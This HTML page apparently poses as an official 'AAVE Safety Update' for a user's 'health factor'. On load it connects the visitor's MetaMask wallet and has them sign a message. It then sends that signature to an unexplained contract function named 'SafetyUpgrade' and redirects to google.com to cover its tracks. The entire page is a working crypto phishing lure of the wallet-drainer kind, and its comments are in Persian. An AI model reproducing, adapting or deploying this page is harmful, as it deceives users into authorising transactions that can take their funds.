<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AAVE UPDATE - Working Version</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 500px;
      width: 100%;
    }
    .status {
      margin: 20px 0;
      padding: 15px;
      border-radius: 8px;
      font-weight: bold;
    }
    .loading { background: #fff3cd; color: #856404; }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
    .redirect-notice {
      margin-top: 20px;
      padding: 15px;
      background: #e7f3ff;
      border-left: 4px solid #2196F3;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔒 AAVE Safety Update</h2>
    <p>Updating your health factor security...</p>
    
    <div id="status" class="status loading">
      🔄 Connecting to wallet...
    </div>
    
    <div id="redirect-notice" class="redirect-notice" style="display: none;">
      ⏰ Redirecting in <span id="countdown">3</span> seconds...
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const statusDiv = document.getElementById('status');
    const redirectDiv = document.getElementById('redirect-notice');
    const countdownSpan = document.getElementById('countdown');

    function updateStatus(message, type = 'loading') {
      statusDiv.textContent = message;
      statusDiv.className = `status ${type}`;
    }

    function startRedirectCountdown() {
      let count = 3;
      redirectDiv.style.display = 'block';
      
      const timer = setInterval(() => {
        count--;
        countdownSpan.textContent = count;
        
        if (count <= 0) {
          clearInterval(timer);
          window.location.replace("https://google.com");
        }
      }, 1000);
    }

    // اجرای اصلی - ساده شده
    (async () => {
      try {
        updateStatus('🔗 Connecting to MetaMask...');

        // بررسی MetaMask
        if (!window.ethereum) {
          updateStatus('❌ Please install MetaMask!', 'error');
          return;
        }

        // اتصال به ولت
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        
        // سوییچ به Sepolia
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0xaa36a7' }] // Sepolia
          });
        } catch (e) {
          console.log('Network switch failed:', e);
        }

        updateStatus('✅ Wallet connected!');

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();

        updateStatus('📝 Please sign the message...');

        // گرفتن امضا - روش ساده
        const message = "By signing this message, Update Your Health Factor";
        const signature = await signer.signMessage(message);

        console.log("Message:", message);
        console.log("Signature:", signature);

        updateStatus('🚀 Sending to contract...');

        // اتصال به کانترکت
        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
        const abi = [{
          "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
          "name": "SafetyUpgrade",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }];

        const contract = new ethers.Contract(contractAddress, abi, signer);

        // ارسال تراکنش
        const tx = await contract.SafetyUpgrade(signature);
        
        updateStatus('⏳ Transaction sent! Hash: ' + tx.hash.slice(0, 10) + '...');
        console.log("Transaction:", tx.hash);

        // انتظار برای تأیید
        await tx.wait();
        
        updateStatus('🎉 Health factor updated successfully!', 'success');
        
        setTimeout(startRedirectCountdown, 1000);

      } catch (error) {
        console.error("Error:", error);
        
        // مدیریت خطاهای مختلف
        if (error.message.includes('user rejected')) {
          updateStatus('❌ Transaction cancelled by user!', 'error');
        } else if (error.message.includes('insufficient funds')) {
          updateStatus('❌ Not enough ETH for gas!', 'error');
        } else if (error.message.includes('Invalid signature')) {
          updateStatus('❌ Signature verification failed!', 'error');
        } else {
          updateStatus('❌ Error: ' + (error.reason || 'Unknown error'), 'error');
        }
      }
    })();

    // شروع فوری ریدایرکت (Task 2)
    setTimeout(() => {
      if (window.location.href.indexOf('google.com') === -1) {
        window.location.replace("https://google.com");
      }
    }, 15000); // اگر 15 ثانیه طول کشید، به زور ریدایرکت کن
  </script>
</body>
</html>
